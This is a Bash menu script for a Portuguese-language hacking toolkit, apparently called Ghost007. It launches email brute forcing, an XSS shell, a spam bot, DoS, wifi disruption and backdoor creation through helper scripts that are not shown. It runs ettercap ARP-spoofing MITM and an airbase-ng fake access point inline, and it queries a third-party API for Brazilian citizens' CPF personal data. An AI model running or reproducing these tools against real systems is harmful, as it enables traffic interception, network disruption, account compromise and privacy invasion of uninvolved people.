#!/bin/bash

# Cores
end="\033[m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
cyan="\033[1;36m"
white="\033[1;37m"
purple="\033[1;35m"

clear

username=$(cat requisitos/username.txt)
banner=$(bash requisitos/banner.sh)

echo "$banner"

sleep 0.10

sleep 0.1
printf "${purple}Olá $username\n"
sleep 0.10
printf "${green}{0} sair do script		          	{10} Criar backdoor automaticamente\n"
sleep 0.1
printf "{1} consultar cep                               {11} arp spoofing (mitm)\n"
sleep 0.1
printf "{2} Rastrear ip                                 {12} Consultar codigo de banco\n"
sleep 0.1
printf "{3} Brute force em email                        {13} Consultar operadora de número\n"
sleep 0.1
printf "{4} Shell em XSS                                {14} Consulta DDD\n"
sleep 0.1
printf "{5} Descriptografar MD5                         {15} Consultar dados de CPF\n"
sleep 0.1
printf "{6} Spam-Bot					{97} Atualizar script\n"
sleep 0.1
printf "{7} Ataque D0S					{98} Mudar Username\n"
sleep 0.1
printf "{8} Derrubar wifi 				{99} Creditos && infos \n"
sleep 0.1
printf "{9} criar rede wifi fake\n"
echo " "
read -p "Escolha uma opção >> " opcao
case "$opcao" in
	0)
		echo "tchau ( ^_^)／"
		exit 1
	;;

	1)
		figlet consulta_cep
		read -p "Cep que você deseja consultar: " cep
		curl https://viacep.com.br/ws/$cep/json/
	;;


	2)
		ipinfo=bash requisitos/ipinfo.sh
	;;

	3)
		brute=bash requisitos/brute-gmail.sh
	;;

	4)
		cd requisitos
		python3 shellxss.py
		cd ..
	;;

	5)
		echo "Essa descriptografia é feita com brute force"
		echo "Então não garanto que você ira conseguir descriptografar"
		echo "tenha uma Wordlist instalada"
		read -p "Hash: " hash
		read -p "caminho da wordlist: " word
		php requisitos/md5b.php -f $word -v $hash
	;;

	6)
		cd requisitos/
		python3 SpamBot.py
		cd ..
	;;

	7)
		bash requisitos/t50config.sh
	;;

	8)
		wifidos=bash requisitos/WifiDos.sh
	;;

	9)
		echo "Recomendo usar a interface wlan0mon"
		read -p "Sua Interface: " interface
		read -p "Canal onde sua rede vai ficar ospedada: " canal
		read -p "Nome da Rede: " Rede
		airbase-ng $interface -c $canal -e $Rede
	;;

	10)
		cd requisitos/creat-backdoor
		bash back.sh
		cd ..
	;;

	11)
mensagem="
esse ataque não funciona em sites com
proteção https"
		echo "$mensagem"
		read -p "Presione {Enter} para continuar"
		figlet arp_spoof
		read -p "Digite sua interface: " arpiface
		read -p "Digite o ip do alvo: " iparp
		clear
		cat requisitos/cat-ascii
		echo " "
		sleep 0.70
		echo "Iniciando ataque..."
		echo "precione {Ctrl c} para parar o ataque"
		ettercap -T -q -i $arpiface -P arp_spoof -M arp /$iparp//
	;;

	12)
		figlet consulta-banco
		read -p "Digite o codigo do banco:" codigo
		echo "Resultado:"
		curl https://brasilapi.com.br/api/banks/v1/$codigo
	;;

	13)
		perl requisitos/operadora.pl
	;;

	14)
		figlet Consulta-DDD
		read -p "Informe o DDD: " ddd
		wget https://brasilapi.com.br/api/ddd/v1/$ddd -O ddd.txt
		sed 's/,/\n  /g' ddd.txt | sed 's/:/: /g' | sed 's/"//g' | sed 's/{/\ \ /' | sed 's/}//' | sed 's/\[//' | sed 's/\]/\n/' | sed 's/state/estado/' | sed 's/cities/cidades/'
		rm ddd.txt
	;;

	15)
		figlet consulta-cpf
		echo "exemplo: 10345675917"
		read -p "Digite o cpf: " cpf
		curl https://netinmakerapi.000webhostapp.com/KINY-GAY/CONSULTA%20CPF%20SIMPLES/api.php?cpf=$cpf
	;;

	97)
		clear
		cd requisitos/
		bash atualizar.sh
	;;

	98)
		read -p "Seu Username: " user
		rm requisitos/username.txt
		touch requisitos/username.txt
		printf "$user" >> requisitos/username.txt
		printf "${blue}[i]Username alterado com sucesso\n${end}"
		sleep 2
		bash Ghost007.sh
	;;

	99)
		figlet -c Creditos
		printf "${purple}By: H7X \n"
		printf "Versão: 4.0 \n"
		printf "Github: https://github.com/H7XX \n"
		printf "Youtube: https://www.youtube.com/channel/UCKHc3Id634qWSrZ_vbQKGTQ \n"
		printf " \n"
		printf "script de consultar operadora de número feito por: \n"
		printf " \n"
		printf "rafaelmspc \n"
		printf  "\n"
		printf "Script de descriptografar MD5 Feito por: \n"
		printf " \n"
		printf "barcellosDev \n"
		printf "${end}"
	;;

	*)
		echo -e "${red}[!]Opção invalida${end}"
		sleep 2
		bash Ghost007.sh
	;;

esac
